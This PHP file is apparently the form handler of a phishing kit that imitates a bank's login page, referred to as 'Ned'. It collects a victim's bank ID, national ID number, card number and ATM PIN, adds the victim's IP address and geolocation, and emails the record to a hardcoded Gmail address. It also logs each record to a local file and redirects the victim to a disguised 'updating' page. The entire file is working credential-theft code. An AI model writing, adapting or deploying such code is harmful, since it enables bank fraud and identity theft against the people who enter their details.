<?php

$name = $_POST['rr0298938029'];
$message0 = $_POST['rsaid'];
$message1 = $_POST['cardno'];
$message2 = $_POST['atmpn'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];



$email_body = "=============NED ID=START=================================== \n";
$email_body .= "Ned ID: $name \n";
$email_body .= "ENTER RSA ID Number: $message0 \n";
$email_body .= "ENTER CARD NUMBER: $message1 \n";
$email_body .= "ENTER ATM PIN: $message2 \n";
$email_body .= 	"IP: {$geoplugin->ip}  \n";
$email_body .= 	"City: {$geoplugin->city}  \n";
$email_body .= 	"Region: {$geoplugin->region}  \n";
$email_body .= 	"Country Name: {$geoplugin->countryName}  \n";
$email_body .= 	"Country Code: {$geoplugin->countryCode}  \n";
$email_body .= 	"User-Agent: ".$browser."  \n";
$email_body .= "Date Log  : ".$date."  \n";
$email_body .= "Time Log  : ".$time." \n";
$email_body .= "========END=================================== \n";
 
$email_from = "Ned 2nd <support@".$_SERVER['HTTP_HOST'].">";
$email_subject = "[$geoplugin->ip] [$name] 2nd Result Ned CC EN | [$name]";
 
$to = "ogidijonas@gmail.com";//<== update the email address
$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);


//done. redirect to thank-you page.

header("Location: ZHRoPSI0MHB4IiBoZWlnaHQ9IjQwcHgiIHZpZXdCb3g9IjAgMCA1M_updating.php");

$fp = fopen("backup.txt","a");
fputs($fp,$email_body);
fclose($fp);

   
?> 
